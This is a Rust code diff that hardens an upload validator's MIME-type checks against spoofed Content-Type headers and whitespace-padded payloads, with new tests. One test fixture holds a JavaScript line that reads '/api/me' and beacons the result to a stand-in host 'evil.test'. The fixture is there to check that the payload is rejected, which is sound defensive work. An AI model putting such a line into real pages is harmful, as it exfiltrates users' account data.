@@ -160,11 +160,15 @@ pub trait MimeAllowlist: Send + Sync + Default {
 /// The detected type from `infer::get` (magic-byte sniffing of the actual
 /// content) is authoritative and is matched against `allowed`. The
 /// client-declared `Content-Type` is consulted **only** when `infer`
-/// cannot recognise the bytes, and even then markup/script payloads are
-/// rejected outright so a text file (SVG, HTML, JS) carrying a spoofed
-/// binary header (e.g. `image/png`) can never satisfy an image allowlist.
+/// cannot recognise the bytes, and only for a type `infer` has no magic
+/// bytes for (`text/csv`, `application/json`): a declared `image/png` on
+/// bytes `infer` did not recognise as a PNG is a false claim. Markup and
+/// script payloads are rejected before the header is read at all, so a
+/// text file (SVG, HTML, JS) carrying a spoofed binary header can never
+/// satisfy an image allowlist.
 fn validate_against_allowlist(
     sniff: &[u8],
+    size: u64,
     content_type: Option<&str>,
     allowed: &[&str],
 ) -> Result<(), FrameworkError> {
@@ -183,7 +187,15 @@ fn validate_against_allowlist(
     // would smuggle behind a spoofed binary `Content-Type`. Reject any
     // part whose leading bytes look like markup or a script before
     // considering the (untrusted) client header at all.
-    if looks_like_markup_or_script(sniff) {
+    let content = sniff_content(sniff);
+    if looks_like_markup_or_script(content) {
+        return Err(refused());
+    }
+    // Only the first `SNIFF_BYTES` of a part are kept for sniffing. A window
+    // of nothing but whitespace says nothing about what follows it, and
+    // markup placed past it would otherwise reach the header fallback
+    // unseen. A part that is whitespace end to end was seen in full.
+    if content.is_empty() && size > sniff.len() as u64 {
         return Err(refused());
     }
 
@@ -193,6 +205,14 @@ fn validate_against_allowlist(
         .map(|ct| ct.split(';').next().unwrap_or(ct).trim())
         .filter(|ct| !ct.is_empty())
         .ok_or_else(refused)?;
+
+    // A type `infer` knows the magic bytes of would have been detected
+    // above. Bytes it did not recognise are not that type, whatever the
+    // header says - script text declared `image/png` is the case this
+    // closes, since it carries no markup marker for the check above.
+    if infer::is_mime_supported(&declared.to_ascii_lowercase()) {
+        return Err(refused());
+    }
 
     if !allowed.iter().any(|m| m.eq_ignore_ascii_case(declared)) {
         return Err(refused());
@@ -227,24 +247,29 @@ fn max_file_message(max_bytes: usize) -> ValidationMessage {
         ))
 }
 
-/// Heuristic: do the leading bytes look like text markup (SVG/HTML/XML) or
-/// a script? Used to reject text payloads that `infer` does not recognise
-/// before any client-header fallback. Whitespace and a UTF-8 BOM are
-/// skipped so leading indentation does not defeat the check.
-fn looks_like_markup_or_script(sniff: &[u8]) -> bool {
+/// The sniff buffer past a UTF-8 BOM and leading whitespace, so leading
+/// indentation does not defeat the checks that read it.
+fn sniff_content(sniff: &[u8]) -> &[u8] {
     let bytes = sniff.strip_prefix(&[0xEF, 0xBB, 0xBF]).unwrap_or(sniff);
     let start = bytes
         .iter()
         .position(|b| !b.is_ascii_whitespace())
         .unwrap_or(bytes.len());
-    let trimmed = &bytes[start..];
+    &bytes[start..]
+}
+
+/// Heuristic: do the leading bytes of `content` (see [`sniff_content`])
+/// look like text markup (SVG/HTML/XML) or a script? Used to reject text
+/// payloads that `infer` does not recognise before any client-header
+/// fallback.
+fn looks_like_markup_or_script(content: &[u8]) -> bool {
     // First non-whitespace byte being `<` covers SVG, HTML, XML (incl.
     // `<?xml`, `<!DOCTYPE`, `<svg`, `<html`, `<script`).
-    if trimmed.first() == Some(&b'<') {
+    if content.first() == Some(&b'<') {
         return true;
     }
     // Common script shebang.
-    trimmed.starts_with(b"#!")
+    content.starts_with(b"#!")
 }
 
 /// Upload validator that rejects parts whose effective MIME type is not in
@@ -260,10 +285,10 @@ impl<L: MimeAllowlist + 'static> UploadValidator for MimeType<L> {
     fn validate_final(
         &self,
         sniff: &[u8],
-        _size: u64,
+        size: u64,
         ct: Option<&str>,
     ) -> Result<(), FrameworkError> {
-        validate_against_allowlist(sniff, ct, L::allowed())
+        validate_against_allowlist(sniff, size, ct, L::allowed())
     }
 }
 
@@ -365,16 +390,57 @@ mod tests {
         assert!(run(script, Some("image/png")).is_err());
     }
 
+    #[derive(Default)]
+    struct OnlyCsv;
+    impl MimeAllowlist for OnlyCsv {
+        fn allowed() -> &'static [&'static str] {
+            &["text/csv"]
+        }
+    }
+
+    fn run_csv(sniff: &[u8], size: u64, ct: Option<&str>) -> Result<(), FrameworkError> {
+        MimeType::<OnlyCsv>::default().validate_final(sniff, size, ct)
+    }
+
     #[test]
-    fn unidentifiable_non_markup_falls_back_to_client_header() {
-        // Bytes infer cannot classify and which are not markup: the
-        // client header is the only signal left.
-        let opaque = &[0x01u8, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08];
-        assert!(run(opaque, Some("image/png")).is_ok());
-        assert!(run(opaque, Some("image/png; charset=binary")).is_ok());
+    fn unidentifiable_bytes_fall_back_to_the_header_only_for_types_magic_cannot_detect() {
+        // `text/csv` has no magic bytes, so for bytes infer cannot
+        // classify the client header is the only signal left.
+        let csv = b"name,email\nann,ann@example.com\n";
+        assert!(run_csv(csv, csv.len() as u64, Some("text/csv")).is_ok());
+        assert!(run_csv(csv, csv.len() as u64, Some("text/csv; charset=utf-8")).is_ok());
         // Wrong / missing header on unidentifiable bytes is rejected.
-        assert!(run(opaque, Some("text/plain")).is_err());
-        assert!(run(opaque, None).is_err());
+        assert!(run_csv(csv, csv.len() as u64, Some("text/plain")).is_err());
+        assert!(run_csv(csv, csv.len() as u64, None).is_err());
+
+        // `image/png` does have magic bytes. Bytes infer cannot classify
+        // are therefore not a PNG, whatever the header claims.
+        let opaque = &[0x01u8, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08];
+        assert!(run(opaque, Some("image/png")).is_err());
+        assert!(run(opaque, Some("IMAGE/PNG; charset=binary")).is_err());
+    }
+
+    /// Script text carries no `<` or `#!` marker, so the markup check
+    /// alone let it through on a spoofed image header.
+    #[test]
+    fn script_text_behind_a_spoofed_image_header_is_rejected() {
+        let script = b"fetch('/api/me').then(r => r.text()).then(t => navigator.sendBeacon('//evil.test', t));";
+        let err = run(script, Some("image/png")).expect_err("script text is not a PNG");
+        assert_eq!(err.status_code(), 422);
+    }
+
+    /// Only the first 16 KiB of a part is sniffed. A sniff window of pure
+    /// whitespace says nothing about what follows it, so markup placed
+    /// past the window must not reach the header fallback.
+    #[test]
+    fn content_hidden_past_a_whitespace_sniff_window_is_rejected() {
+        let window = vec![b' '; 16 * 1024];
+        assert!(
+            run_csv(&window, window.len() as u64 + 64, Some("text/csv")).is_err(),
+            "the bytes after the window were never inspected"
+        );
+        // A part that is whitespace end to end was inspected in full.
+        assert!(run_csv(&window, window.len() as u64, Some("text/csv")).is_ok());
     }
 
     fn refused_key(result: Result<(), FrameworkError>) -> String {
